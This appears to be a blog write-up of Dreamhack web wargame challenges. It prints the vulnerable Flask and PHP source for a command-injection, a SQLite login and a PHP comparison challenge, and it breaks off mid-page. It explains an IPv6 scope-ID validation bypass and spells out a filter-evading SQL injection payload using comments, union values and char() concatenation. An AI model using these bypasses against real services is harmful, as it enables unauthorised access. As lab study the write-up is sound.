        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="EZ-command-injection"><a href="#EZ-command-injection" class="headerlink" title="EZ_command_injection"></a><strong><a target="_blank" rel="noopener" href="https://dreamhack.io/wargame/challenges/1204">EZ_command_injection</a></strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>ez command injection chall</strong></p>
<p><strong>Host: host3.dreamhack.games</strong></p>
<p><strong>Port:  11953&#x2F;tcp → 8000&#x2F;tcp</strong></p>
<p><strong>For pwnables: nc host3.dreamhack.games 11953</strong></p>
<p><strong>For Web: <a target="_blank" rel="noopener" href="http://host3.dreamhack.games:11953/">http://host3.dreamhack.games:11953/</a></strong></p>
<p>It give some file which is app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ping&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>():</span><br><span class="line">    host = request.args.get(<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        addr = ipaddress.ip_address(host)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        error_msg = <span class="string">&#x27;Invalid IP address&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(error_msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=error_msg)</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">f&#x27;ping -c 3 <span class="subst">&#123;addr&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output([<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd], timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=output.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        error_msg = <span class="string">&#x27;Timeout!!!!&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(error_msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=error_msg)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">        error_msg = <span class="string">&#x27;An error occurred while executing the command&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(error_msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=error_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>You can notice here <code>(&#39;/ping&#39;, methods=[&#39;GET&#39;])</code>, the <code>host</code> parameter is allowed in the ping directory</p>
<p><img src="/img/Dreamhack1.png" alt="Untitled"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://host3.dreamhack.games:<span class="number">23815</span>/ping?host=</span><br></pre></td></tr></table></figure>

<p>If you enter ipaddress you can notice the server output An error occurred while executing the command</p>
<p><img src="/img/Dreamhack1_1.png" alt="Untitled"></p>
<p>If you enter the common command injection payload after the IP</p>
<p><img src="/img/Dreamhack1_2.png" alt="Untitled"></p>
<p>So let’s review the code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addr = ipaddress.ip_address(host)</span><br></pre></td></tr></table></figure>

<p>Maybe we need to find a way around ipaddress restriction</p>
<p>Go search for this part of python parameters</p>
<p><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv6Address">https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv6Address</a></p>
<ul>
<li><em>class</em> ipaddress.<strong>IPv6Address</strong>(<em>address</em>)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Construct an IPv6 address. An [AddressValueError](https://docs.python.org/<span class="number">3</span>/library/ipaddress.html<span class="comment">#ipaddress.AddressValueError) is raised if *address* is not a valid IPv6 address.</span></span><br><span class="line">The following constitutes a valid IPv6 address:</span><br><span class="line"><span class="number">1.</span> A string consisting of eight groups of four hexadecimal digits, each group representing <span class="number">16</span> bits. The groups are separated by colons. This describes an *exploded* (longhand) notation. The string can also be *compressed* (shorthand notation) by various means. See **[RFC <span class="number">4291</span>](https://datatracker.ietf.org/doc/html/rfc4291.html)** <span class="keyword">for</span> details. For example, <span class="string">&quot;0000:0000:0000:0000:0000:0abc:0007:0def&quot;</span> can be compressed to <span class="string">&quot;::abc:7:def&quot;</span>.</span><br><span class="line">Optionally, the string may also have a scope zone ID, expressed <span class="keyword">with</span> a suffix %scope_id. If present, the scope ID must be non-empty, <span class="keyword">and</span> may <span class="keyword">not</span> contain %. See **[RFC <span class="number">4007</span>](https://datatracker.ietf.org/doc/html/rfc4007.html)** <span class="keyword">for</span> details. For example, fe80::<span class="number">1234</span>%<span class="number">1</span> might identify address fe80::<span class="number">1234</span> on the first link of the node.</span><br><span class="line"><span class="number">2.</span> An integer that fits into <span class="number">128</span> bits.</span><br><span class="line"><span class="number">3.</span> An integer packed into a [<span class="built_in">bytes</span>](https://docs.python.org/<span class="number">3</span>/library/stdtypes.html<span class="comment">#bytes) object of length 16, big-endian.&gt;&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">**&gt;&gt;&gt; ipaddress.IPv6Address(<span class="string">&#x27;2001:db8::1000&#x27;</span>)</span><br><span class="line">IPv6Address(<span class="string">&#x27;2001:db8::1000&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ipaddress.IPv6Address(<span class="string">&#x27;ff02::5678%1&#x27;</span>)</span><br><span class="line">IPv6Address(<span class="string">&#x27;ff02::5678%1&#x27;</span>)**</span><br></pre></td></tr></table></figure>

<p>I noticed something about the scope ID of IPV6</p>
<p>what <code>%scope_id</code> Let’s dig into this part</p>
<p><strong>IPv6 connectivity must first be considered within its own scope.</strong><br>This is why this parameter is needed</p>
<p>The link local addresses of all network cards in the world are on the same <strong>fe80::&#x2F;16</strong> network segment! , but they may not necessarily be able to ping each other. This is a big difference from IPv4.</p>
<p>All link-local addresses of IPv6 are in the same network segment, and IP routing alone is not enough to allow them to communicate with each other.</p>
<p>IPv6 addresses have strict scope restrictions. Two addresses must first be restricted within their own scopes, and then routing connectivity is considered.</p>
<p>The following %enp0s9 is required, it specifies the dimension of a link! Otherwise, without this dimension restriction, the next bottom layer of the <code>ping6</code> command will be addressed according to the longest prefix matching rule for global addresses. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ping6 fe80::ebad:<span class="number">9145</span>:fe66:55cc%enp0s9</span><br><span class="line"></span><br><span class="line">fe80::<span class="number">1</span>:<span class="number">2</span>:<span class="number">3</span>:<span class="number">4</span>%eth0</span><br><span class="line">fe80::<span class="number">1</span>:<span class="number">2</span>:<span class="number">3</span>:<span class="number">4</span>%<span class="number">9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If we use this method, add scope_id after the IPV6 and execute the command injection command, we may be able to get what we want.</p>
<p><img src="/img/Dreamhack1_3.png" alt="Untitled"></p>
<hr>
<hr>
<h3 id="baby-sqlite"><a href="#baby-sqlite" class="headerlink" title="baby-sqlite"></a><strong>baby-sqlite</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>로그인 서비스입니다.<br>SQL INJECTION 취약점을 통해 플래그를 획득하세요!해당 문제는 숙련된 웹해커를 위한 문제입니다.</strong></p>
<p><strong>Host: host3.dreamhack.games</strong></p>
<p><strong>Port:  23313&#x2F;tcp → 8001&#x2F;tcp</strong></p>
<p><strong>For pwnables: nc host3.dreamhack.games 23313</strong></p>
<p><strong>For Web: <a target="_blank" rel="noopener" href="http://host3.dreamhack.games:23313/">http://host3.dreamhack.games:23313/</a></strong></p>
<p>this question only give a one file ⇒ app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, make_response, redirect, url_for, session, g</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">32</span>)</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> _app_ctx_stack</span><br><span class="line"></span><br><span class="line">DATABASE = <span class="string">&#x27;users.db&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_db</span>():</span><br><span class="line">    top = _app_ctx_stack.top</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(top, <span class="string">&#x27;sqlite_db&#x27;</span>):</span><br><span class="line">        top.sqlite_db = sqlite3.connect(DATABASE)</span><br><span class="line">    <span class="keyword">return</span> top.sqlite_db</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    FLAG = <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    FLAG = <span class="string">&#x27;[**FLAG**]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    uid = request.form.get(<span class="string">&#x27;uid&#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">    upw = request.form.get(<span class="string">&#x27;upw&#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">    level = request.form.get(<span class="string">&#x27;level&#x27;</span>, <span class="string">&#x27;9&#x27;</span>).lower()</span><br><span class="line"></span><br><span class="line">    **sqli_filter = [<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\x08&#x27;</span>, <span class="string">&#x27;\x09&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x0b&#x27;</span>, <span class="string">&#x27;\x0d&#x27;</span>, <span class="string">&#x27; &#x27;</span>]**</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> sqli_filter:</span><br><span class="line">        <span class="keyword">if</span> uid.find(x) != -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> upw.find(x) != -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> level.find(x) != -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack!&#x27;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        conn = get_db()</span><br><span class="line">        query = <span class="string">f&quot;SELECT uid FROM users WHERE uid=&#x27;<span class="subst">&#123;uid&#125;</span>&#x27; and upw=&#x27;<span class="subst">&#123;upw&#125;</span>&#x27; and level=<span class="subst">&#123;level&#125;</span>;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = conn.execute(query)</span><br><span class="line">            result = req.fetchone()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                uid = result[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> uid == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                    <span class="keyword">return</span> FLAG</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close_connection</span>(<span class="params">exception</span>):</span><br><span class="line">    top = _app_ctx_stack.top</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(top, <span class="string">&#x27;sqlite_db&#x27;</span>):</span><br><span class="line">        top.sqlite_db.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.system(<span class="string">&#x27;rm -rf %s&#x27;</span> % DATABASE)</span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        conn = get_db()</span><br><span class="line">        conn.execute(<span class="string">&#x27;CREATE TABLE users (uid text, upw text, level integer);&#x27;</span>)</span><br><span class="line">        conn.execute(<span class="string">&quot;INSERT INTO users VALUES (&#x27;dream&#x27;,&#x27;cometrue&#x27;, 9);&quot;</span>)</span><br><span class="line">        conn.commit()</span><br><span class="line"></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8001</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Enter the login page. If you directly enter the SQL syntax, No Hack will be output.</p>
<p><img src="/img/Dreamhack1_4.png" alt="Untitled"></p>
<p>You can notice that uid, upw, and level are written in the program. Only level can be used, and the other two are filtered. </p>
<p>Both uid and upw values are converted to lowercase letters using the lower() method. This conversion operation is to unify the user input into lowercase letters to ensure that there will be no problems due to case in subsequent SQL queries.</p>
<p>Therefore, even if the uid and upw entered by the user contain uppercase letters, they will be converted to lowercase letters before subsequent processing, thus preventing the possibility of bypassing verification through case confusion in SQL injection attacks.</p>
<p>But!</p>
<p>The value of level is set to ‘9’.lower(). This means that even if the user does not provide a value for level, or provides an invalid value, the program will set level to ‘9’ and then convert it to lowercase letters. </p>
<p>The purpose of this setting may be to ensure that the value of level is always a valid number.</p>
<p>However, this also means that even if the user does not provide a value for level, no error will be raised. </p>
<p>And even if a non-numeric value is supplied, it will be treated as ‘9’. Such a design may increase security risks in some cases because it makes it easier for attackers to operate at the level of .</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">uid = request.form.get(<span class="string">&#x27;uid&#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">upw = request.form.get(<span class="string">&#x27;upw&#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">level = request.form.get(<span class="string">&#x27;level&#x27;</span>, <span class="string">&#x27;9&#x27;</span>).lower()</span><br></pre></td></tr></table></figure>

<p>Notice that SQL has filtered content that cannot be included when inputting. You need to find a way to bypass it.</p>
<p>User inputs cannot contain any form of whitespaces, including spaces, tabs, and new lines.</p>
<p>but whitespaces can be supplied by using comments (&#x2F;**&#x2F;)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">**sqli_filter = [<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\x08&#x27;</span>, <span class="string">&#x27;\x09&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x0b&#x27;</span>, <span class="string">&#x27;\x0d&#x27;</span>, <span class="string">&#x27; &#x27;</span>]**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>It need to use admin to login then get the Flag, But admin filtered</p>
<p>SO maybe using SQLite’s built-in function char() and concat operator (||)</p>
<p>And then using UNION replace select</p>
<p>If u go to see the official documentation</p>
<p><a target="_blank" rel="noopener" href="https://www.sqlite.org/syntax/compound-select-stmt.html">https://www.sqlite.org/syntax/compound-select-stmt.html</a></p>
<p>compound-select-stmt refers to the compound query statement in SQL. In SQL, a compound query statement combines multiple SELECT statements and uses specific keywords to indicate how to combine the results of these queries.</p>
<p>Note here that the UNION statement should be followed by select-core</p>
<p><img src="/img/Dreamhack1_5.png" alt="Untitled"></p>
<p>let see select-core</p>
<p><a target="_blank" rel="noopener" href="https://www.sqlite.org/syntax/select-core.html">https://www.sqlite.org/syntax/select-core.html</a></p>
<p>Fortunately, in addition to select, you can also select values</p>
<p><img src="/img/Dreamhack1_6.png" alt="Untitled"></p>
<p>Finally build the exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">9/**/union/**/values(char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e))</span><br></pre></td></tr></table></figure>

<p> <strong>char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e)</strong>  is a method used to construct a string in SQL. The char() function is used to return the ASCII code corresponding character of.</p>
<ul>
<li>char(0x61) is the hexadecimal value 0x61, and the corresponding decimal value is 97, which represents the lowercase letter ‘a’</li>
<li>char(0x64) is the decimal value 100, which represents The corresponding ASCII code of the lowercase letter ‘d’</li>
<li>char(0x6d) is decimal 109, which represents the lowercase letter ‘m’</li>
<li>char(0x69) is decimal 105, which represents the lowercase letter ‘i’</li>
<li>char(0x6e) The corresponding ASCII code is decimal 110, which represents the lowercase letter ‘n’.</li>
</ul>
<p><img src="/img/Dreamhack1_7.png" alt="Untitled"></p>
<hr>
<h3 id="php7cmp4re"><a href="#php7cmp4re" class="headerlink" title="php7cmp4re"></a><strong>php7cmp4re</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>php 7.4로 작성된 페이지입니다.</strong></p>
<p><strong>알맞은 Input 값을 입력하고 플래그를 획득하세요.</strong></p>
<p><strong>플래그 형식은 <code>DH&#123;&#125;</code> 입니다.</strong></p>
<ul>
<li><strong>Servers</strong></li>
</ul>
<p><strong>host: host3.dreamhack.games</strong></p>
<p><strong>Port:  23760&#x2F;tcp → 8000&#x2F;tcp</strong></p>
<p><strong>For pwnables: nc host3.dreamhack.games 23760</strong></p>
<p><strong>For Web: <a target="_blank" rel="noopener" href="http://host3.dreamhack.games:23760/">http://host3.dreamhack.games:23760/</a></strong></p>
<p>This question it give 3 file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;php7cmp4re&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- Fixed navbar --&gt;</span><br><span class="line">    &lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span> <span class="title">navbar</span>-<span class="title">fixed</span>-<span class="title">top</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">php7cmp4re</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">navbar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">Index</span> <span class="title">page</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;&lt;!--/.<span class="title">nav</span>-<span class="title">collapse</span> --&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    <span class="title">require_once</span>(&#x27;<span class="title">flag</span>.<span class="title">php</span>&#x27;);</span></span><br><span class="line"><span class="class">    <span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class">    // <span class="title">POST</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">    <span class="title">if</span> ($<span class="title">_SERVER</span>[&quot;<span class="title">REQUEST_METHOD</span>&quot;] == &quot;<span class="title">POST</span>&quot;) </span>&#123;</span><br><span class="line">      <span class="variable">$input_1</span> = <span class="variable">$_POST</span>[<span class="string">&quot;input1&quot;</span>] ? <span class="variable">$_POST</span>[<span class="string">&quot;input1&quot;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="variable">$input_2</span> = <span class="variable">$_POST</span>[<span class="string">&quot;input2&quot;</span>] ? <span class="variable">$_POST</span>[<span class="string">&quot;input2&quot;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$input_1</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$input_2</span> != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$input_1</span>) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$input_1</span> &lt; <span class="string">&quot;8&quot;</span> &amp;&amp; <span class="variable">$input_1</span> &lt; <span class="string">&quot;7.A&quot;</span> &amp;&amp; <span class="variable">$input_1</span> &gt; <span class="string">&quot;7.9&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$input_2</span>) &lt; <span class="number">3</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$input_2</span>) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">              <span class="keyword">if</span>(<span class="variable">$input_2</span> &lt; <span class="number">74</span> &amp;&amp; <span class="variable">$input_2</span> &gt; <span class="string">&quot;74&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;pre&gt;FLAG\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Good try.&lt;/h4&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Good try.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Try again.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Try again.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Fill the input box.&lt;/h4&gt;&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h3&gt;WHat??!&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span> </span><br><span class="line">    &lt;/div&gt; </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;php7cmp4re&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- Fixed navbar --&gt;</span><br><span class="line">    &lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span> <span class="title">navbar</span>-<span class="title">fixed</span>-<span class="title">stop</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">php7cmp4re</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">navbar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">index</span> <span class="title">page</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;&lt;!--/.<span class="title">nav</span>-<span class="title">collapse</span> --&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span 